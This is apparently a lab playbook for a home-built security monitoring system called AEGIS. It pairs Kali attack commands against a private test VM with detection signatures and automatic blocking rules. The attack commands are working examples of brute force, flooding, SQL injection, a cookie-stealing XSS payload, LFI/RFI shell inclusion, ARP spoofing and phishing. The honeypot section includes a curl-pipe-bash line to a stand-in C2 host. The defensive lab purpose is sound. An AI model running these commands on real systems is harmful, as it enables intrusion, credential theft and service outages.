# AEGIS SOC — Attack & Defense Playbook

> **Lab Network**: Kali `192.168.56.101` → Ubuntu `192.168.56.100` (pfSense gateway `192.168.56.1`)  
> **All attacks run from Kali Linux. All defenses apply on Ubuntu VM + pfSense.**

---

## Attack Categories Overview

| # | Attack Type | Tool (Kali) | Sensor Detects | Auto-Defense |
|---|---|---|---|---|
| 1 | Port Scan | nmap | Suricata | block_ip |
| 2 | SSH Brute Force | hydra | Fail2ban + auth.log | block_ip (5 fails/60s) |
| 3 | FTP Brute Force | hydra | vsftpd + Fail2ban | block_ip (10 fails/60s) |
| 4 | SYN Flood / DDoS | hping3 | Suricata | null_route (50 events/30s) |
| 5 | ICMP Flood | hping3 | Suricata | block_ip |
| 6 | UDP Flood | hping3 | Suricata | block_ip |
| 7 | SQL Injection | sqlmap | ModSecurity | block_ip (severity=high) |
| 8 | XSS | curl/browser | ModSecurity | block_ip |
| 9 | LFI / RFI | curl | ModSecurity | block_ip |
| 10 | Directory Traversal | curl | ModSecurity | block_ip |
| 11 | Web Brute Force | hydra / medusa | ModSecurity / auth.log | block_ip |
| 12 | ARP Spoofing / MITM | arpspoof | Suricata | suggest (VLAN isolation) |
| 13 | Honeypot SSH | ssh client | Cowrie | instant block_ip |
| 14 | Credential Stuffing | hydra | Fail2ban | block_ip |
| 15 | TLS Anomaly | openssl / custom | Suricata TLS | log to encrypted_traffic |
| 16 | CSRF | curl | ModSecurity | block_ip |
| 17 | DNS Attack | dnsrecon / fierce | Suricata | block_ip |
| 18 | SMTP Relay Abuse | swaks | Postfix logs | block_ip |

---

## 1. Port Scan

### Attack (Kali)
```bash
# Basic SYN scan
nmap -sS -T4 192.168.56.100

# Full port scan
nmap -sS -T4 -p- 192.168.56.100

# Service version + OS detection
nmap -sV -O -T4 192.168.56.100

# Aggressive scan (all)
nmap -A -T4 192.168.56.100

# Stealth slow scan (bypass rate limit)
nmap -sS -T1 --scan-delay 1s 192.168.56.100
```

### What Suricata Detects
```
ET SCAN Nmap Scripting Engine User-Agent Detected
ET SCAN Potential SSH Scan OUTBOUND
ET SCAN SYN Flood Inbound
```

### Forwarder sends to AEGIS
```json
POST /api/ingest/suricata
{
  "alert": { "signature": "ET SCAN Nmap", "severity": 2 },
  "src_ip": "192.168.56.101",
  "dest_ip": "192.168.56.100"
}
```

### AEGIS Defense Rule
```
Name:           Port Scan → Auto Block
Trigger type:   port_scan
Severity:       any
Threshold:      1 event in 60s
Action:         auto → block_ip
Target VM:      ubuntu
Command:        iptables -I INPUT -s 192.168.56.101 -j DROP
```
**→ ဒီ rule ကို AEGIS မှာ default seed ထားပြီးသား (priority 20)**

---

## 2. SSH Brute Force

### Attack (Kali)
```bash
# hydra brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.100

# hydra with username list
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://192.168.56.100 -t 4

# medusa (faster)
medusa -h 192.168.56.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh

# ncrack
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt 192.168.56.100
```

### What Detects It
- **Fail2ban**: watches `/var/log/auth.log` — 5 failures → ban
- **auth.log**: `Failed password for root from 192.168.56.101`
- **Suricata**: SSH brute signature

### AEGIS Defense Rule
```
Name:           SSH Brute Force → Auto Block
Trigger type:   ssh_brute
Severity:       any
Threshold:      5 events in 60s
Action:         auto → block_ip
Target VM:      ubuntu
Command:        iptables -I INPUT -s 192.168.56.101 -j DROP
```
**→ Default seed rule (priority 10)**

### Ubuntu Fail2ban Config
```ini
# /etc/fail2ban/jail.local
[sshd]
enabled  = true
port     = ssh
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 5
bantime  = 3600
findtime = 60
```

---

## 3. FTP Brute Force

### Attack (Kali)
```bash
# hydra FTP brute
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.100

# With user list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.100 -t 4

# medusa
medusa -h 192.168.56.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

### AEGIS Defense Rule
```
Name:           FTP Brute Force → Block
Trigger type:   ftp_brute
Severity:       any
Threshold:      10 events in 60s
Action:         auto → block_ip
Target VM:      ubuntu
Command:        iptables -I INPUT -s 192.168.56.101 -j DROP
```
**→ Default seed rule (priority 25)**

---

## 4. SYN Flood / DDoS

### Attack (Kali)
```bash
# SYN Flood on port 80
hping3 -S --flood -V -p 80 192.168.56.100

# SYN flood with random source IPs (spoofed)
hping3 -S --flood --rand-source -p 80 192.168.56.100

# UDP flood
hping3 --udp --flood -p 53 192.168.56.100

# ICMP flood
hping3 --icmp --flood 192.168.56.100

# Slowloris (HTTP keep-alive exhaustion)
slowloris 192.168.56.100 -p 80 -s 500
```

### AEGIS Defense Rule
```
Name:           DDoS → Null Route
Trigger type:   ddos
Severity:       any
Threshold:      50 events in 30s
Action:         auto → null_route
Target VM:      ubuntu
Command:        ip route add blackhole 192.168.56.101/32
```
**→ Default seed rule (priority 8)**

### Additional pfSense Rule
```
Name:           DDoS → pfSense Block
Trigger type:   ddos
Severity:       critical
Threshold:      1 in 60s
Action:         auto → pfsense_block
Target VM:      pfsense
Command:        {"action":"block_ip","ip":"192.168.56.101"}
```

---

## 5. SQL Injection

### Attack (Kali)
```bash
# Basic sqlmap scan
sqlmap -u "http://192.168.56.100/login.php?id=1" --dbs

# POST parameter
sqlmap -u "http://192.168.56.100/login.php" \
       --data="username=admin&password=test" \
       --dbs --batch

# Dump tables
sqlmap -u "http://192.168.56.100/app.php?id=1" \
       -D webapp -T users --dump --batch

# Boolean-based blind
sqlmap -u "http://192.168.56.100/page.php?id=1" \
       --technique=B --level=3 --batch

# Manual test with curl
curl "http://192.168.56.100/login.php?id=1' OR '1'='1"
curl "http://192.168.56.100/login.php?id=1; DROP TABLE users--"
```

### What Detects It
- **ModSecurity**: OWASP CRS rules — `SQL Injection Attack Detected`
- **Suricata**: `ET WEB_SERVER SQL Injection Attempt`

### AEGIS Defense Rule
```
Name:           Web Attack (High) → Auto Block
Trigger type:   web_attack
Severity:       high
Threshold:      1 event in 60s
Action:         auto → block_ip
Target VM:      ubuntu
Command:        iptables -I INPUT -s 192.168.56.101 -j DROP
```
**→ Default seed rule (priority 15)**

---

## 6. XSS (Cross-Site Scripting)

### Attack (Kali)
```bash
# Reflected XSS via curl
curl "http://192.168.56.100/search.php?q=<script>alert('XSS')</script>"

# XSS in POST body
curl -X POST http://192.168.56.100/comment.php \
     -d "comment=<script>document.location='http://192.168.56.101/steal?c='+document.cookie</script>"

# XSS via URL encoding (bypass basic filters)
curl "http://192.168.56.100/search.php?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# XSS scanner
xsser --url "http://192.168.56.100/search.php?q=" -p "XSS"
```

### AEGIS Defense Rule
Same as Web Attack rule — `web_attack` type covers XSS.

---

## 7. LFI / RFI / Directory Traversal

### Attack (Kali)
```bash
# LFI — read /etc/passwd
curl "http://192.168.56.100/page.php?file=../../../../etc/passwd"
curl "http://192.168.56.100/page.php?file=....//....//etc/passwd"

# LFI with null byte (older PHP)
curl "http://192.168.56.100/page.php?file=../../../../etc/passwd%00"

# RFI — load remote file
curl "http://192.168.56.100/page.php?file=http://192.168.56.101/shell.php"

# Directory traversal
curl "http://192.168.56.100/../../../etc/shadow"
curl "http://192.168.56.100/..%2F..%2F..%2Fetc%2Fpasswd"

# Use dotdotpwn for automated traversal
dotdotpwn -m http -h 192.168.56.100 -f /etc/passwd -d 6
```

### AEGIS Defense Rule
```
Name:           LFI / Path Traversal → Block
Trigger type:   web_attack
Severity:       high
Threshold:      1 event in 60s
Action:         auto → block_ip
```

---

## 8. Web Brute Force (Login)

### Attack (Kali)
```bash
# HTTP POST brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      192.168.56.100 http-post-form \
      "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP GET basic auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-get://192.168.56.100/admin/

# WordPress login brute
wpscan --url http://192.168.56.100/wordpress/ \
       --passwords /usr/share/wordlists/rockyou.txt \
       --usernames admin

# medusa HTTP brute
medusa -h 192.168.56.100 -u admin \
       -P /usr/share/wordlists/rockyou.txt -M http
```

### AEGIS Defense Rule
```
Name:           Web Brute Force → Block
Trigger type:   web_attack
Severity:       medium
Threshold:      20 events in 60s
Action:         auto → block_ip
Target VM:      ubuntu
```

---

## 9. ARP Spoofing / MITM

### Attack (Kali)
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof — intercept traffic between victim and gateway
arpspoof -i eth0 -t 192.168.56.100 192.168.56.1
arpspoof -i eth0 -t 192.168.56.1 192.168.56.100

# Capture traffic with Wireshark/tcpdump while MITM is active
tcpdump -i eth0 -w /tmp/capture.pcap host 192.168.56.100

# SSL strip (downgrade HTTPS to HTTP)
sslstrip -l 8080

# Full MITM with ettercap
ettercap -T -M arp:remote /192.168.56.100// /192.168.56.1//
```

### What Detects It
- **Suricata**: `ET ARP ARP Spoofing / MITM` signature

### AEGIS Defense Rule (Suggest — needs manual VLAN isolation)
```
Name:           MITM / ARP Spoof → Suggest Rule
Trigger type:   mitm
Severity:       any
Threshold:      1 in 60s
Action:         suggest → alert_only
Notes:          Requires VLAN isolation at pfSense level — cannot auto-fix with iptables
```
**→ Default seed rule (priority 40) — creates incident with suggested pfSense command**

### Manual Defense on pfSense
```
Firewall → Rules → LAN → Block ARP traffic from 192.168.56.101
or
Enable Dynamic ARP Inspection under: Services → ARP table → DAI
```

---

## 10. Honeypot (Cowrie SSH)

### Attack (Kali)
```bash
# Connect to Cowrie honeypot (Cowrie listens on port 2222, redirect from 22)
ssh root@192.168.56.100

# Try commands (Cowrie logs everything)
ssh root@192.168.56.100 "cat /etc/passwd"
ssh root@192.168.56.100 "wget http://192.168.56.101/malware.sh"
ssh root@192.168.56.100 "curl http://c2.attacker.com/shell.sh | bash"

# Telnet honeypot
telnet 192.168.56.100 23
```

### What Cowrie Logs
```json
{
  "eventid": "cowrie.login.failed",
  "src_ip": "192.168.56.101",
  "username": "root",
  "password": "123456",
  "session": "abc123"
}
{
  "eventid": "cowrie.command.input",
  "input": "cat /etc/shadow",
  "session": "abc123"
}
```

### AEGIS Defense Rule
```
Name:           Honeypot Touch → Instant Block
Trigger type:   honeypot
Severity:       any
Threshold:      1 event in 1s      ← instant!
Action:         auto → block_ip
Target VM:      ubuntu
Command:        iptables -I INPUT -s 192.168.56.101 -j DROP
```
**→ Default seed rule (priority 5) — highest priority, instant block**

---

## 11. TLS / SSL Anomalies

### Attack (Kali)
```bash
# Test weak cipher suites
sslscan 192.168.56.100:443
nmap --script ssl-enum-ciphers -p 443 192.168.56.100

# Test with expired/self-signed cert
openssl s_client -connect 192.168.56.100:443

# testssl.sh — comprehensive TLS audit
testssl.sh 192.168.56.100:443

# Force SSLv3 / TLS 1.0 (downgrade attack)
openssl s_client -ssl3 -connect 192.168.56.100:443
openssl s_client -tls1 -connect 192.168.56.100:443
```

### What Suricata TLS Detects
```
Weak cipher suite: RC4, DES, 3DES
Protocol downgrade: SSLv3, TLS 1.0
Self-signed certificate
Expired certificate
JA3 fingerprint anomaly
```

### Forwarder sends to AEGIS
```
POST /api/ingest/suricata/tls
→ stored in encrypted_traffic table
→ visible in Connections → TLS Traffic page
```

### AEGIS Defense Rule (logging only — no auto-block needed)
```
Name:           TLS Anomaly → Alert
Trigger type:   tls_suspicious
Severity:       medium
Threshold:      5 events in 60s
Action:         suggest → alert_only
```

---

## 12. SMTP Relay Abuse / Phishing

### Attack (Kali)
```bash
# Test open relay with swaks
swaks --to victim@example.com \
      --from attacker@fake.com \
      --server 192.168.56.100 \
      --port 25

# Send fake email (phishing)
swaks --to admin@company.com \
      --from "security@company.com" \
      --server 192.168.56.100 \
      --header "Subject: Urgent: Reset your password" \
      --body "Click here: http://192.168.56.101/phish"

# SMTP enumerate users (VRFY/EXPN)
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt \
               -t 192.168.56.100
```

### AEGIS Defense Rule
```
Name:           Mail Spam → Auto Block
Trigger type:   mail_attack
Severity:       any
Threshold:      100 events in 60s
Action:         auto → block_ip
Target VM:      ubuntu
```
**→ Default seed rule (priority 30)**

---

## 13. Critical Attack → pfSense Block

Any critical severity attack automatically triggers pfSense-level block:

```
Name:           Critical Attack → pfSense Block
Trigger type:   any
Severity:       critical
Threshold:      1 in 60s
Action:         auto → pfsense_block
Target VM:      pfsense
Command:        {"action":"block_ip","ip":"<IP>","reason":"Critical attack"}
```
**→ Default seed rule (priority 50) — fires after ubuntu-level rules**

---

## Custom Defense Rule Examples

### Create via AEGIS Dashboard (Defense Center → Rules)
Or via API:

```bash
# Create custom rule via API
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/defense/rules \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Admin-Key: YOUR_ADMIN_KEY" \
  -d '{
    "name": "Nmap Scan → Port Block 22",
    "description": "Block SSH port for scanners",
    "triggerAttackType": "port_scan",
    "triggerSeverity": "any",
    "triggerThreshold": 1,
    "triggerWindowSecs": 60,
    "actionType": "auto",
    "defenseType": "port_block",
    "actionParams": "{\"port\": \"22\", \"protocol\": \"tcp\"}",
    "targetVm": "ubuntu",
    "priority": 18,
    "isActive": true
  }'
```

### Defense Type Options

| defenseType | Command Generated | Use When |
|---|---|---|
| `block_ip` | `iptables -I INPUT -s <IP> -j DROP` | Most attacks |
| `null_route` | `ip route add blackhole <IP>/32` | DDoS (full traffic blackhole) |
| `rate_limit` | `iptables -m limit --limit 10/min` | Throttle without full block |
| `port_block` | `iptables -p tcp --dport <port> -j DROP` | Block specific service |
| `dns_block` | `printf '0.0.0.0 domain' >> /etc/hosts` | Block malicious domain |
| `pfsense_block` | pfSense REST API call | Block at firewall perimeter |
| `pfsense_port_block` | pfSense port block | Block port at perimeter |
| `waf_rule` | `modsec_ban.sh <IP>` | Permanent WAF ban |
| `alert_only` | `logger` command | Log only, no block |
